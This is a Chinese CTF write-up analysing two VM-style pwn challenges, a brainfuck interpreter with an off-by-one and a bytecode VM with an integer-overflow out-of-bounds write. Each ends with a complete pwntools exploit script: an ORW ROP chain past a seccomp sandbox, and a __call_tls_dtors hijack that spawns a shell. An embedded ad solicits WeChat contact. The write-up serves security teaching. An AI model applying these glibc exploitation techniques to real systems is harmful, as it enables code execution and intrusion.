### **实验四 VMPWN4**

### 题目简介

这道题应该算是虚拟机保护的一个变种，是一个解释器类型的程序，何为解释器？解释器是一种计算机程序，用于解释和执行源代码。解释器可以理解源代码中的语法和语义，并将其转换为计算机可以执行的机器语言。与编译器不同，解释器不会将源代码转换为机器语言，而是直接执行源代码。即，这个程序接收一定的解释器语言，然后按照一定的规则对其进行解析，完成相应的功能，从本质上来看依然是一个虚拟机。

这个程序是一个brainfuck的解释器，brainfuck的语法如下所示：

![img](https://image.3001.net/images/20230801/1690850953_64c856899fb34e2c000b7.jpeg!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

将这些语法翻译为c代码如下所示：

![img](https://image.3001.net/images/20230801/1690850954_64c8568a99379425cc233.jpeg!small)

  

编辑

添加图片注释，不超过 140 字（可选）

### 题目保护检查

使用checksec来检查程序开启了哪些保护机制

![img](https://image.3001.net/images/20230801/1690850955_64c8568b717c621de0ec1.jpeg!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

所有保护全部开启 使用seccomp-tools检查程序是否开启了沙箱

![img](https://image.3001.net/images/20230801/1690850956_64c8568c651f0eb5afc3e.jpeg!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

只允许open、openat、read、write、brk等少数系统调用，也就是说我们不能通过执行system(“/bin/sh”)或者execve系统调用来拿到shell了。

### 漏洞分析

使用IDA pro打开这个程序 查看伪代码

![img](https://image.3001.net/images/20230801/1690850957_64c8568d71a8d75c5e1fb.jpeg!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

![img](https://image.3001.net/images/20230801/1690850958_64c8568ead887113d5e7b.jpeg!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

看到std::cout以及std::string等函数，可以看出来这个程序是用c++进行编写的，相比于C语言的程序，C++的程序反编译之后分析起来难度会大一些。

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

分析一波sub_1EA2函数

![img](https://image.3001.net/images/20230801/1690850959_64c8568fdabefbf792b3a.png!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

在a1+0x400处创建一个string类，后面的sub_1FAA，sub_1F72很复杂，看不明白，应该是初始化的函数。

然后在 sub_154B 函数中

![img](https://image.3001.net/images/20200701/1593550745.png!small)

  

编辑

添加图片注释，不超过 140 字（可选）

这里就是沙箱开启函数，我们一开始用 seccomp-tools 分析程序得到的沙箱规则就是在这个函数中设置的，对程序的系统调用功能进行了种种限制。

接着输入 code，每次输入 1 字节，然后将这 1 字节拼接到 string 中， 在这里我们可以动态调试一下输入过程，因为 string
是一个类，其内部有其他成员。我们将断点下载 while 循环结束之后，即读取完了 code，我们首先输入 5 个'>',string 类在
rbp-0x40，我们查看其中内容：

![img](https://image.3001.net/images/20200701/1593550745.png!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

前8个字节是一个指针，指向我们输入的code存放的地址，第2个8字节是输入的字节数，后面的就是我们输入的code，这里我们只输入了5个字节，直接在存在了栈中。我们多输入一些，大于0x10个字符

[

![img](https://image.3001.net/images/20230801/1690850961_64c856913baa830a4ea32.png!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

![img](https://image.3001.net/images/20230801/1690850962_64c856921150b84eeb3fc.png!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

前8个字节变为了堆地址，我们输入的数据被存入了堆中，第2个8字节依然书我们输入的字节数，第3个8字节0x1e，应该是剩余可用空间，0x13+0x1e=0x31。
总的来说，如果输入字符数小于0x10，string类的大概成员应该如下

    
    
    struct string  
    {  
    char *data;  
    int64_t size;  
    char data[0x10];  
    ...  
    }

如果大于0x10则为如下

    
    
    struct  
    {  
    char *buf;  
    int64_t size;  
    int64_t capacity;  
    char tmp_data[8];  
    ...  
    }

继续分析程序

![img](https://image.3001.net/images/20230801/1690850962_64c85692f2d55eceea88a.jpeg!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

中间这一段 for 循环应该是遍历所有输入的 code，寻找[和],也就是寻找程序的边界，为什么是寻找程序的边界，可以再看一下 brainfuck 解释为
c 语言之后的效果。 []所包裹起来的 code，就是 while 循环之内要执行的代码。 从这个 for 循环往下，就是对 brainfuck
的解释代码，会依次判断每个字符的值，并进行相应的操作。

首先看到对>的操作

![img](https://image.3001.net/images/20230801/1690850963_64c85693e79962c47a0cb.png!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

会对v19进行+1操作，v19是啥呢？

![img](https://image.3001.net/images/20230801/1690850959_64c8568fdabefbf792b3a.png!small)

  

  

添加图片注释，不超过 140 字（可选）

s是最开始初始化的时候传入的一个长度为0x400的数组，这里将v19赋值为s数组的地址，每当解析到>时，就将v19往后移动一个字节，然后对v19进行判断

![img](https://image.3001.net/images/20230801/1690850965_64c856958080660712a40.png!small)

  

编辑

添加图片注释，不超过 140 字（可选）

在if判断中存在问题，当v19指针大于string指针是退出，也就是说v19可以等于string指针，即v19可以指向string的第一个字节，存在off-by-one。如下图

![img](https://image.3001.net/images/20230801/1690850966_64c856964ed20ba6a8a1e.png!small)

  

编辑

添加图片注释，不超过 140 字（可选）

v19可以指向画框的1字节。

后续的其他操作就都和最开始贴出来的brainfuck语法一样了，也没有漏洞。

接下来开始利用漏洞。

第一步还是得先泄露libc地址。 泄露方法是通过将v19指向string的第一字节，也就是buf指针的最后1字节。

![img](https://image.3001.net/images/20230801/1690850967_64c856973f15635be28d6.png!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

在0x7fffffffde68处就是main函数的返回地址，我们将buf指针的最后1字节修改为68，这样buf就会指向返回地址。
在程序的最后，会将string的数据输出

![img](https://image.3001.net/images/20230801/1690850968_64c85698190c9f907439e.png!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

而此时string的buf已经被我们指向了返回地址，输出时就会泄露出libc_start_main的地址。
在这里我们需要注意，想要buf指针能够指向栈中，我们输入的数据不能超过0x10个字节，而v19和string相差多少呢？

![img](https://image.3001.net/images/20230801/1690850968_64c85698ce13e97a2ed81.png!small)

  

编辑

添加图片注释，不超过 140 字（可选）

v19是指向s的，s和string相差了0x400的距离，所以我们需要将v19增加0x400才行，但如果我们输入0x400个>，又会调用malloc，这样buf就会变成堆地址。所以这里就得了解brainfuck语法，使用[]可以达成类似于循环的效果。只需要+[>+],这5个字符就可以一直循环增加v19指针，并在v19指向string的第1字节时自动停止，然后往string的第1字节写入1字节的数据，换成c的语法如下

    
    
    ++*ptr;  
    while(*ptr)  
    {  
    ptr++;  
    ++*ptr;  
    }

这看起来是一个死循环，为啥能够自动在指向string的第1个字节时自动停止呢？这是因为，当执行完>使得v19指向string后，接下来会执行+使得string的buf指针+1，变成了下图所示：

![img](https://image.3001.net/images/20230801/1690850969_64c8569988c9bfccebdce.png!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

于是，原本要取]，因为指针+1，就会取到,，从而跳出循环。 还有一点就是，因为aslr的缘故，栈地址会一直改变，所以泄露libc地址需要多试几次才能成功。
拿到libc地址之后，就可以进行利用了，由于此时string的buf指针指向的是返回地址，我们再次输入code的时候就会往返回地址上写，所以我们可以构造好orw的rop链，直接写入返回地址，然后当我们结束main函数的时候就会执行orw链。
另外，还有需要注意的地方，在程序开头和结尾，有这么几个函数 开头

![img](https://image.3001.net/images/20230801/1690850970_64c8569a623744c07f6ce.png!small)

  

编辑

添加图片注释，不超过 140 字（可选）

结尾

![img](https://image.3001.net/images/20230801/1690850971_64c8569bad82430ee239f.png!small)

  

编辑

添加图片注释，不超过 140 字（可选）

开头的应该是构造函数，结尾的应该是析构函数。
在漏洞利用中我们将string的buf指向了返回地址，如果我们在这个时候退出了while循环，执行析构函数时就会报错，所以我们在布置完orw链后还需要对string的buf进行修正，让它指向正确的位置。

### 利用脚本

    
    
    from pwn import *  
    context.log_level='debug'  
    global io  
    libc=ELF('./libc.so.6')  
    ​  
    def debug(addr,PIE=True):  
    if PIE:  
    text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)  
    gdb.attach(io,'b *{}'.format(hex(text_base+addr)))  
    else:  
    gdb.attach(io,"b *{}".format(hex(addr)))  
    ​  
    def pwn():  
    payload = '+[>+],'  
    io.recvuntil('enter your code:\n')  
      
    io.sendline(payload)  
    io.recvuntil('running....\n')  
    io.send(p8(0xd8))  
    io.recvuntil("your code: ")  
    libc_base = u64(io.recvuntil('\x7f',timeout=0.5)[-6:].ljust(8,'\x00')) - 231 - libc.sym['__libc_start_main']  
    if libc_base>>40!=0x7f:  
    raise Exception("leak error!")  
    log.success('libc_base => {}'.format(hex(libc_base)))  
    pop_rdi_ret=libc_base+0x000000000002155f  
    pop_rsi_ret=libc_base+0x0000000000023e6a  
    pop_rdx_ret=libc_base+0x0000000000001b96  
    open_addr=libc_base+libc.symbols['open']  
    read_addr=libc_base+libc.symbols['read']  
    write_addr=libc_base+libc.symbols['write']  
    log.success('open_addr => {}'.format(hex(open_addr)))  
    log.success('read_addr => {}'.format(hex(read_addr)))  
    log.success('write_addr => {}'.format(hex(write_addr)))  
    ​  
    flag_str_addr=(libc_base+libc.symbols['__free_hook'])&0xfffffffffffff000  
    ​  
    orw=p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_ret)+p64(flag_str_addr)+p64(pop_rdx_ret)+p64(0x10)+p64(read_addr)  
    orw+=p64(pop_rdi_ret)+p64(flag_str_addr)+p64(pop_rsi_ret)+p64(0)+p64(open_addr)  
    orw+=p64(pop_rdi_ret)+p64(3)+p64(pop_rsi_ret)+p64(flag_str_addr+0x10)+p64(pop_rdx_ret)+p64(0x100)+p64(read_addr)  
    orw+=p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_ret)+p64(flag_str_addr+0x10)+p64(pop_rdx_ret)+p64(0x100)+p64(write_addr)  
    ​  
    io.recvuntil('want to continue?\n')  
    io.send('y')  
    io.recvuntil('enter your code:\n')  
    ​  
    io.sendline(orw+payload)  
    ​  
    io.recvuntil('running....\n')  
    io.send('\xa0')  
    io.recvuntil('want to continue?\n')  
    io.send('n')  
    io.send('./flag')  
    ​  
    io.interactive()  
    ​  
    if __name__ == "__main__":  
    while True:  
    try:  
    io=process('./bf')  
    pwn()  
    except:  
    io.close()

###  **实验五 VMPWN5**

### 题目简介

这道题是一道很典型的VMPWN，接收字节码，对字节码进行解析，执行对应功能。不过这题相较于前面的vmpwn有些区别，前几题都都是同时存在越界读和越界写漏洞的，然而这道题仅存在一个越界写漏洞，这就要求更加开阔和灵活的解题思路。

### 题目保护检查

![img](https://image.3001.net/images/20230801/1690850972_64c8569c6a139fa2555bb.jpeg!small)

  

编辑

添加图片注释，不超过 140 字（可选）

保护全部开启了。

### 漏洞分析

IDA打开程序

![img](https://image.3001.net/images/20230801/1690850973_64c8569d2929b49ce1349.jpeg!small)

  

编辑

添加图片注释，不超过 140 字（可选）

读取一段字符，如果这段字符串不为”bye bye”，则调用sub_228E函数

看到sub_228E函数

![img](https://image.3001.net/images/20230801/1690850974_64c8569e10003a5e8949c.jpeg!small)

  

编辑

添加图片注释，不超过 140 字（可选）

首先根据字符串的输出将各个变量重命名。

![img](https://image.3001.net/images/20230801/1690850976_64c856a025702cbed8887.jpeg!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

先让用户输入code_size，也就是字节码的长度；接着让用户输入memory
count，也就是内存的大小，内存的单位是8字节，后面通过malloc申请memory count*8大小的堆块作为内存。
然后读取code，最后调用sub_1458函数，跟进查看

![img](https://image.3001.net/images/20230801/1690850977_64c856a13aebb1ee0443a.jpeg!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

似乎是一个初始化函数，但具体做了什么我们暂不清楚，继续往下看，跟进到sub_151A函数。

![img](https://image.3001.net/images/20230801/1690850978_64c856a2766efd9d91665.jpeg!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

这里就是熟悉的解析字节码了，我们将前面的函数和变量重命名一下

为了方便逆向分析，我们首先来确定虚拟机的结构体。

![img](https://image.3001.net/images/20230801/1690850979_64c856a38ddca739faa1b.jpeg!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

首先根据这里的判断，我们猜测通用寄存器的索引不能大于3，也就是通用寄存器有 4个。 我们再回看到init_vm结构体。

![img](https://image.3001.net/images/20230801/1690850980_64c856a497a0c65368caf.jpeg!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

qword_5040应该为pc指针，因为它指向的是code的开头，ptr指向内存的开头，后面又malloc出来了一块0x800的堆，猜测这个qword_5050应该就是栈顶指针rsp，重命名之后如下

![img](https://image.3001.net/images/20230801/1690850981_64c856a58d164387e7ad4.jpeg!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

重新看回到exec_vm函数

qword_5088很明显是当前运行了多少code。 而我们注意到

![img](https://image.3001.net/images/20230801/1690850982_64c856a68f730395e397e.jpeg!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

我们刚刚重命名的指针都是位于同一块区域，所以这一块区域应该就是vm虚拟机的位置。

根据刚刚的分析，创建如下结构体

    
    
    struct vm  
    {  
    char *code;  
    int64_t *memory;  
    int64_t *stack;  
    int64_t codesize;  
    int64_t memcnt;  
    int64_t regs[4];  
    int64_t rip;  
    int64_t rsp;  
    };  
    ​

再将其应用于IDA中，此时exec_vm已经变得很清晰

![img](https://image.3001.net/images/20230801/1690850983_64c856a7d70b992cc819b.jpeg!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

![img](https://image.3001.net/images/20230801/1690850985_64c856a91efc096230e4b.jpeg!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

![img](https://image.3001.net/images/20230801/1690850986_64c856aa7a58f9d7d279a.jpeg!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

![img](https://image.3001.net/images/20230801/1690850987_64c856aba19e2a8c558a6.jpeg!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

一共24个功能，每个操作码对应的功能如下：

    
    
    0：push  
    ​  
    1：pop  
    ​  
    2：将栈中的两个值相加  
    ​  
    3：将栈中的两个值相减  
    ​  
    4：将栈中的两个值相乘  
    ​  
    5：将栈中的两个值相除  
    ​  
    6：将栈中的两个值取模  
    ​  
    7：将栈中的两个值左移  
    ​  
    8：将栈中的两个值右移  
    ​  
    9：将栈中的两个值相与  
    ​  
    11：将栈中的两个值相或  
    ​  
    12：将栈中的两个值相异或  
    ​  
    13：判断栈顶值是否为0  
    ​  
    14：jmp  
    ​  
    15：条件jmp，如果栈顶有值就jmp，没有就不jmp  
    ​  
    16：条件jmp，和15相反  
    ​  
    17：判断栈顶的两个值是否相等  
    ​  
    18：判断栈顶值是否小于栈顶下的一个值  
    ​  
    19：判断栈顶值是否大于栈顶下的一个值  
    ​  
    20：将一个立即数存入寄存器中  
    ​  
    21：将寄存器中的值存入内存中  
    ​  
    22：将内存中的值存入寄存器中  
    ​  
    23：打印finish

接下来开始分析漏洞

在最开始输入mem_cnt时有一个判断，如下

![img](https://image.3001.net/images/20230801/1690850989_64c856ad198d8afb55a0f.jpeg!small)

  

编辑

添加图片注释，不超过 140 字（可选）

在这里，当输入类似0x2000000000000020的mem_cnt时，后续申请到的memory大小就为0x100
因为0x2000000000000008会超过64位能表示的最大数字从而导致整数溢出，只有最后的0x208会保留下来。

![img](https://image.3001.net/images/20230801/1690850989_64c856addeb64cd0fb3a9.jpeg!small)

  

编辑

添加图片注释，不超过 140 字（可选）

在执行opcode时，0x15功能点处检查内存是否越界依然使用的是一开始输入的mem_cnt，因此存在越界写，可以将寄存器中的数据写到任意内存中。而在0x16功能点处的内存读功能则由于v8
>= 8 * vmx.memcnt / 8的处理，失去了越界读的效果，所以题目的漏洞就在于0x15功能点的越界写。

但是，由于不存在越界读功能，我们无法从内存中读取libc地址信息到寄存器中，虚拟机也没有输出功能，因此我们需要另辟蹊径。

首先如何生成libc地址，注意在exec_vm结束后，会清理虚拟机的各个段

![img](https://image.3001.net/images/20230801/1690850990_64c856aeb13de7856d5cd.jpeg!small)

  

编辑

添加图片注释，不超过 140 字（可选）

由于将堆free了会链入到unsortedbin中，因此堆中就会留下libc地址，再重新初始化一个虚拟机，这个新的虚拟机的内存段中就会包含libc地址。

![img](https://image.3001.net/images/20230801/1690850991_64c856af802125b3faffc.jpeg!small)

  

编辑

添加图片注释，不超过 140 字（可选）

当opcode大于0x17时，会输出what???，可以根据这个构造盲注来泄露libc地址.

首先将libc地址push到栈上，然后将1<<i(5<=i<=40)也push到栈上，然后通过0x9的按位与功能

![img](https://image.3001.net/images/20230801/1690850992_64c856b03f4ba71480431.jpeg!small)

  

编辑

添加图片注释，不超过 140 字（可选）

检测该位是否为1，如果为1的话就执行一个错误的opcode，输出what???，如果为0的话就跳转回code开头，继续测试下一位是否为1，由此可以一位一位地得到libc地址。

![img](https://image.3001.net/images/20230801/1690850993_64c856b10a37d857a131d.jpeg!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

如上图所示，这是mem区残留的libc地址，首先将libc地址mov到reg[0]中，如下图

![img](https://image.3001.net/images/20230801/1690850994_64c856b21d9e01dfd24e2.jpeg!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

然后将其push到栈中

![img](https://image.3001.net/images/20230801/1690850995_64c856b348d34692e4405.jpeg!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

接着我们往reg[1]中写入1<<i，i从5开始，到40结束，因为libc地址的末尾4位为0，且开头一定为0x7f，所以只需要从第5位测试到第40位即可

![img](https://image.3001.net/images/20230801/1690850996_64c856b423515c93312a3.jpeg!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

如上图，reg[1]中存放着1<<8，然后将其压入栈中

![img](https://image.3001.net/images/20230801/1690850997_64c856b52f69c6ebb69fa.jpeg!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

再将这两个值进行按位与

![img](https://image.3001.net/images/20230801/1690850989_64c856ad198d8afb55a0f.jpeg!small)

  

编辑

添加图片注释，不超过 140 字（可选）

![img](https://image.3001.net/images/20230801/1690850989_64c856addeb64cd0fb3a9.jpeg!small)

  

编辑切换为居中

添加图片注释，不超过 140 字（可选）

将按位与之后的结果存入栈底，然后我们判断栈底为1或者0，为1的话就输出finish，为0的话就输出what？，以此来判断libc的每一位数据为1或者0.

得到libc地址之后就该思考如何getshell了。

拿到libc地址后，再加上任意地址写，随便怎么打都可以，这里采用打call_tls_dtors来getshell。

call_tls_dtors是什么？

main函数正常退出时，会调用exit函数

    
    
    void  
    exit (int status)  
    {  
    __run_exit_handlers (status, &__exit_funcs, true, true);  
    }  
    libc_hidden_def (exit)

exit函数调用了__run_exit_handlers函数

    
    
    __run_exit_handlers (int status, struct exit_function_list **listp,  
    bool run_list_atexit, bool run_dtors)  
    {  
    /* First, call the TLS destructors.  */  
    #ifndef SHARED  
    if (&__call_tls_dtors != NULL)  
    #endif  
    if (run_dtors)  
    __call_tls_dtors ();  
    ​  
    .....................  
    _exit (status);  
    }

 **run_exit_handlers函数中，会检查run_dtors，如果为真就会调用** call_tls_dtors

动态调试exit函数，可以看到run_dtors的值

    
    
    pwndbg> p run_dtors   
    $1 = true

因此 **call_tls_dtors是会被执行的，再看到** call_tls_dtors函数

    
    
    void  
    __call_tls_dtors (void)  
    {  
    while (tls_dtor_list)  
    {  
    struct dtor_list *cur = tls_dtor_list;  
    dtor_func func = cur->func;  
    #ifdef PTR_DEMANGLE  
    PTR_DEMANGLE (func);  
    #endif  
      
    tls_dtor_list = tls_dtor_list->next;  
    func (cur->obj);  
      
    /* Ensure that the MAP dereference happens before  
    l_tls_dtor_count decrement.  That way, we protect this access from a  
    potential DSO unload in _dl_close_worker, which happens when  
    l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */  
    atomic_fetch_add_release (&cur->map->l_tls_dtor_count, -1);  
    free (cur);  
    }  
    }

如果tls_dtor_list存在的话，就会将tls_dtor_list赋值给cur，而cur是一个dtor_list的结构体指针，定义如下

    
    
    struct dtor_list  
    {  
    dtor_func func;  
    void *obj;  
    struct link_map *map;  
    struct dtor_list *next;  
    };

然后将cur->func赋值给func，然后调用PTR_DEMANGLE (func)，定义如下

    
    
    #  define PTR_DEMANGLE(var) asm ("ror $2*" LP_SIZE "+1, %0\n"         \  
    "xor %%fs:%c2, %0"               \  
    : "=r" (var)                 \  
    : "0" (var),                 \  
    "i" (offsetof (tcbhead_t,          \  
    pointer_guard)))

纯汇编如下

    
    
    0x7ffff7e21428 <__call_tls_dtors+40>    ror    rax, 0x11  
    0x7ffff7e2142c <__call_tls_dtors+44>    xor    rax, qword ptr fs:[0x30]  
    0x7ffff7e21435 <__call_tls_dtors+53>    mov    qword ptr fs:[rbx], rdx  
    0x7ffff7e21439 <__call_tls_dtors+57>    mov    rdi, qword ptr [rbp + 8]  
    0x7ffff7e2143d <__call_tls_dtors+61>    call   rax

与之相对的是PTR_MANGLE(var)

    
    
    #  define PTR_MANGLE(var)	asm ("xor %%fs:%c2, %0\n"		      \  
    "rol $2*" LP_SIZE "+1, %0"		      \  
    : "=r" (var)			      \  
    : "0" (var),			      \  
    "i" (offsetof (tcbhead_t,	      \  
    pointer_guard)))

PTR_MANGLE可以看作是加密过程，PTR_DEMANGLE 则是解密过程，循环右移0x11位，然后和fs:[0x30]异或得出解密之后的值。

fs:[0x30]是什么？64位程序中，函数退栈时检查canary的那条汇编语句就是xor rcx, qword ptr
fs:[0x28]，里面也出现了fs，实际上fs是一个TLS结构体，定义如下

    
    
    typedef struct  
    {  
    void *tcb;		/* Pointer to the TCB.  Not necessarily the  
    thread descriptor used by libpthread.  */  
    dtv_t *dtv;  
    void *self;		/* Pointer to the thread descriptor.  */  
    int multiple_threads;  
    uintptr_t sysinfo;  
    uintptr_t stack_guard;  
    uintptr_t pointer_guard;  
    int gscope_flag;  
    /* Bit 0: X86_FEATURE_1_IBT.  
    Bit 1: X86_FEATURE_1_SHSTK.  
    */  
    unsigned int feature_1;  
    /* Reservation of some values for the TM ABI.  */  
    void *__private_tm[3];  
    /* GCC split stack support.  */  
    void *__private_ss;  
    /* The lowest address of shadow stack,  */  
    unsigned long ssp_base;  
    } tcbhead_t;

stack_guard就是fs:[0x28]，也就是canary，相应的，fs:[0x30]就是pointer_guard。如何定位TLS结构体？在pwndbg使用如下方式

    
    
    pwndbg> canary   
    canary : 0xed8519fd5f3d4700  
    pwndbg> search -p 0xed8519fd5f3d4700  
    0x7ffff7fca568 0xed8519fd5f3d4700  
    pwndbg> x /20xg 0x7ffff7fca568-0x28  
    0x7ffff7fca540:	0x00007ffff7fca540	0x00007ffff7fcae90  
    0x7ffff7fca550:	0x00007ffff7fca540	0x0000000000000000

回到函数中来，解密了func之后，会执行

    
    
    func (cur->obj);

而func和cur->obj同属于tls_dtor_list结构体，而这个结构体的来源是tls_dtor_list这个指针，如果我们能够控制这个指针指向我们可控的内存那么就能够劫持程序。我们继续动态调试查看tls_dtor_list的值

    
    
    pwndbg> p tls_dtor_list   
    Cannot find thread-local storage for process 5047, shared library /usr/lib/freelibs/amd64/2.31-0ubuntu9.2_amd64/libc.so.6:  
    Cannot find thread-local variables on this target

但是pwndbg并不能直接查看到tls_dtor_list的内容，看地址也不行，那我们继续从汇编中找

查看while (tls_dtor_list)处的汇编，如下

    
    
    0x7ffff7e2140a <__call_tls_dtors+10>    mov    rbx, qword ptr [rip + 0x1a094f]  
    ► 0x7ffff7e21411 <__call_tls_dtors+17>    mov    rbp, qword ptr fs:[rbx]  
    0x7ffff7e21415 <__call_tls_dtors+21>    test   rbp, rbp  
    0x7ffff7e21418 <__call_tls_dtors+24>    je     __call_tls_dtors+93 <__call_tls_dtors+93>

将fs:[rbx]处的值赋给rbp，然后检查rbp是否为0

此时RBP的值为

    
    
    RBX  0xffffffffffffffa8

补码形式，转换成负数就是-0x58，也就是将fs:[-0x58]处的值赋给RBP，所以tls_dtor_list的地址就为fs:[-0x58]。

整个利用流程就是，将tls_dtor_list的值修改为我们可控内存的地址，一般是堆的地址，然后根据dtor_list结构体的布局

    
    
    struct dtor_list  
    {  
    dtor_func func;  
    void *obj;  
    struct link_map *map;  
    struct dtor_list *next;  
    };

我们只需要将在堆中将func伪造为加密后的system的地址，obj为/bin/sh即可。

按照上面说的思路，我们利用越界写将pointer_guard修改为0，然后修改dtor_list结构体的值，将func修改为加密后的system地址，将会obj修改为binsh的地址，最后我们推出虚拟机的时候就会触发system(“/bin/sh”)来getshell。

### 利用脚本

    
    
    from pwn import *  
    context.log_level='debug'  
    io=process('./ezvm')  
    libc=ELF('./libc-2.35.so')  
    ​  
    io.recvuntil('Welcome to 0ctf2022!!\n')  
    io.sendline('lock')  
    io.recvuntil('size:\n')  
    io.sendline('38')  
    io.recvuntil('memory count:\n')  
    io.sendline('256')  
    code=p8(0x17)+p8(0xff)*36  
    io.recvuntil('code:\n')  
    io.sendline(code)  
    io.recvuntil('continue?\n')  
    io.sendline('y')  
    ​  
    leak=0  
    for i in range(5,40,1):  
    print("leaking bit"+str(i)+':'+str(bin(1<<i)))  
    code=p8(0x16)+p8(0)+p64(0) #mov reg[0],mem[0]  
    code+=p8(0)+p8(0) #push r0  
    code+=p8(0x14)+p8(1)+p64(1<<i) #mov reg[1],1<<i  
    code+=p8(0)+p8(1) #push r1  
    code+=p8(0x9) #AND  
    code+=p8(0x10)+p64(1)  
    code+=p8(0x18)+p8(0x17)  
    io.recvuntil('size:\n')  
    io.sendline(str(len(code)))  
    io.recvuntil('memory count:\n')  
    io.sendline('256')  
    io.recvuntil('code:\n')  
      
    io.sendline(code)  
    # gdb.attach(io)  
    # pause()  
    data=io.recvuntil('finish!\n',drop=True)  
    if 'what' in data:  
    leak|=(1<<i)  
    ​  
    leak|=0x7f0000000000  
    log.success('leak => {}'.format(hex(leak)))  
    libc_base=leak-0x219ce0  
    system_addr=libc_base+libc.symbols['system']  
    binsh_addr=libc_base+libc.search('/bin/sh\x00').next()  
    tls_dtor_list_addr=libc_base-0x28c0-0x58  
    log.success('libc_base => {}'.format(hex(libc_base)))  
    log.success('system_addr => {}'.format(hex(system_addr)))  
    log.success('binsh_addr => {}'.format(hex(binsh_addr)))  
    ​  
    size = 0x2000000000030000  
    io.recvuntil('size:\n')  
    io.sendline('100')  
    io.recvuntil('memory count:\n')  
    io.sendline(str(size))  
    code=p8(0x15)+p8(0)+p64(0x302ec) #mov mem[0x302eb],reg[0]  
    enc=((system_addr^0)>>(64-0x11))|((system_addr^0)<<0x11)  
    code+=p8(0x14)+p8(1)+p64(enc) #mov reg[1],system_addr  
    code+=p8(0x14)+p8(2)+p64(binsh_addr) #mov reg[2],binsh_addr  
    code+=p8(0x14)+p8(3)+p64(libc_base+0x220000) #mov reg[3],libc_base+0x220000  
    code+=p8(0x15)+p8(3)+p64(0x302db)  
    code+=p8(0x15)+p8(1)+p64(0x747fe)    
    code+=p8(0x15)+p8(2)+p64(0x747ff)   
    io.recvuntil('code:\n')  
    #gdb.attach(io)  
    io.sendline(code)  
    io.recvuntil('continue?\n')  
    io.sendline('bye bye')  
    ​  
    ​  
    ​  
    io.interactive()

